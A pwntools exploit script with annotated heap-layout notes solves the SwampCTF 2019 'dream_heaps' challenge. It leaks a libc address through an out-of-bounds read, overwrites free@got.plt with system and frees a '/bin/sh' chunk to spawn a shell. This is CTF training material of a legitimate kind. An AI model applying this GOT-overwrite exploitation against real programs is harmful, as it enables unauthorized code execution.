from pwn import *

s = process("./dream_heaps")
libc = ELF("./libc-2.27.so")

def read(where):
    s.sendlineafter ("> ", "2")
    s.sendlineafter ("read?", str(where))
    reply = s.recvuntil("What").replace("What", "")
    reply = reply.replace("\x0a", "")
    return reply

def write(what, size):
    s.recvuntil("> ")
    s.sendline( "1")
    s.recvuntil("dream?")
    s.sendline (str(size))
    s.recvuntil("dream?")
    s.send( what)

def edit(where, content):
    s.recvuntil("> ")
    s.sendline ("3")
    s.recvuntil("change?")
    s.sendline (str(where))
    log.info("system: {}".format(hex(u64(content))))    
    s.send(content)

def delete(where):
    s.recvuntil("> ")
    s.sendline( "4")
    s.recvuntil("delete?")
    s.sendline(str(where))
""" root@8f2438658959:/ctf_directory/nightmare/modules/11-index/swampctf19_dreamheaps# objdump -R dream_heaps | grep free
0000000000602018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
"""
free_got_plt = 0x0000000000602018

leak = read(-263021)        # the pointer to puts@got.plt is -263021 addresses (each address is 8 bytes) away from HEAP_PTRS 
leak += "\x00"*(8-len(leak))
log.info("puts leak: {}".format(hex(u64(leak))))
libc_base = u64(leak) - libc.symbols["puts"]
log.info("libc base: {}".format(hex(libc_base)))

write("/bin/sh\x00", 0x10)
for i in range(2,16):
    write("0"*0x10, 16*i)

write("0", 0x11)
write("0", 0x22)
write("0", 0x18)
write("0",free_got_plt)          # 18th index for HEAP_PTRS, but it will write free_got_plt to the 17th index
write("0", 00)                  # 0 to prevent it from corrupting free_got_plt address

edit(17, p64(libc_base + libc.symbols["system"]))
delete(0)
s.interactive()


""" Heap layout:
gefâž¤  x/50x 0x006020a0
0x6020a0 <HEAP_PTRS>:	0x00603670	0x00000000	0x00603690	0x00000000
0x6020b0 <HEAP_PTRS+16>:	0x006036b0	0x00000000	0x006036d0	0x00000000
0x6020c0 <HEAP_PTRS+32>:	0x006036f0	0x00000000	0x00603710	0x00000000
0x6020d0 <HEAP_PTRS+48>:	0x00603730	0x00000000	0x00603750	0x00000000
0x6020e0 <SIZES>:	0x00603770	0x00000000	0x00603790	0x00000000
0x6020f0 <SIZES+16>:	0x006037b0	0x00000000	0x006037d0	0x00000000
0x602100:	0x006037f0	0x00000000	0x00603810	0x00000000
0x602110:	0x00603830	0x00000000	0x00603850	0x00000009
0x602120:	0x00000009	0x00000009	[*]0x00602018	[19_size]0x00000020
0x602130:	0x006038b0	0x00000000	[19]0x006038d0	0x00000000
0x602140:	0x00000000	0x00000000	0x00000000	0x00000000
0x602150:	0x00000000	0x00000000	0x00000000	0x00000000
0x602160:	0x00000000	0x00000000 

At the 18th index of HEAP_PTRS, we write its size into the 17th index [*] of HEAP_PTRS. But when if we want to modify the 17th index, the corresponding size in SIZES must be valid => write another time (19th index) so that the size value at SIZES+19 [19_size] will be valid
[*] This is because each time we write, HEAP_PTRS add another pointer which is 8-bytes long, so it clears out the 4 bytes after. For example, when we write to the 1st index, HEAP_PTRS+1 is at 0x6020a0+8, and it is pointing to 0x0000000000603690. Because an address is 8-bytes long, we need to find the xth index of HEAP_PTRS so that the corresponding xth index in SIZES is big enough to overwrite the got address (> 8 bytes)
"""
